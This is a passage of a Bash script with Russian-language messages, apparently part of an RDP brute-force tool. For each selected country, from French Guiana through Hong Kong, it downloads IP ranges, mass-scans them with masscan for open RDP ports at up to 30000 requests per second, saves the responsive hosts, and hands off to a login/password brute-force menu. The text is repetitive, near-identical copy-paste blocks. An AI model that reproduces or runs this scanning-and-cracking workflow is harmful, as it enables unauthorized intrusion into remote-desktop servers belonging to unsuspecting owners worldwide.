echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "64" ]; then
curl http://services.ce3c.be/ciprg/?countrys=FRENCH+GUIANA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/French Guiana://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "65" ]; then
curl http://services.ce3c.be/ciprg/?countrys=FRENCH+POLYNESIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/French Polynesia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "66" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GABON |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Gabon://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "67" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GAMBIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Gambia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "68" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GEORGIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Georgia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "69" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GERMANY |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Germany://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "70" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GHANA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Ghana://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "71" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GIBRALTAR |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Gibraltar://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "72" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GREECE |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Greece://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "73" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GREENLAND |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Greenland://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "74" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GRENADA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Grenada://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "75" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GUAM |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Guam://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "76" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GUATEMALA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Guatemala://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "77" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GUINEA-BISSAU |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Guinea-bissau://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "78" ]; then
curl http://services.ce3c.be/ciprg/?countrys=HAITI |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Haiti://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "79" ]; then
curl http://services.ce3c.be/ciprg/?countrys=HOLY+SEE+%28VATICAN+CITY+STATE |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Holy See (VATICAN City State)://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "80" ]; then
curl http://services.ce3c.be/ciprg/?countrys=HONDURAS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Honduras://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "81" ]; then
curl http://services.ce3c.be/ciprg/?countrys=HONG+KONG |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Hong Kong://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
